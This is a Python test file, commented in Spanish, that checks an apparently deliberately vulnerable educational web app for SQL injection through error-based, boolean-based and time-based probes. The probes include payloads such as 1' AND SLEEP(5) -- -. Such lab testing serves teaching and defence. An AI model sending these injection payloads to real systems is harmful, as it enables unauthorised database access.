"""Pruebas de los escenarios de SQL Injection: error, booleano y tiempo."""

import time

import requests


def test_search_error_based(base_url):
    response = requests.get(
        f"{base_url}/search", params={"q": "'"}, timeout=15
    )
    assert response.status_code == 200
    # El error SQL real debe ser visible en la respuesta.
    assert "Error SQL" in response.text
    assert "syntax" in response.text.lower() or "1064" in response.text


def test_product_boolean_based(base_url):
    true_response = requests.get(
        f"{base_url}/product", params={"id": "1' AND '1'='1"}, timeout=15
    )
    false_response = requests.get(
        f"{base_url}/product", params={"id": "1' AND '1'='2"}, timeout=15
    )

    assert true_response.status_code == 200
    assert false_response.status_code == 200
    assert true_response.text != false_response.text

    # Con la condición verdadera se recupera el producto 1.
    assert "Laptop Educativa" in true_response.text
    # Con la condición falsa no se recupera nada.
    assert "Laptop Educativa" not in false_response.text


def test_product_time_based(base_url):
    start = time.time()
    response = requests.get(
        f"{base_url}/product", params={"id": "1' AND SLEEP(5) -- -"}, timeout=30
    )
    elapsed = time.time() - start

    assert response.status_code == 200
    assert elapsed > 4.0, f"La respuesta tardó sólo {elapsed:.2f}s"
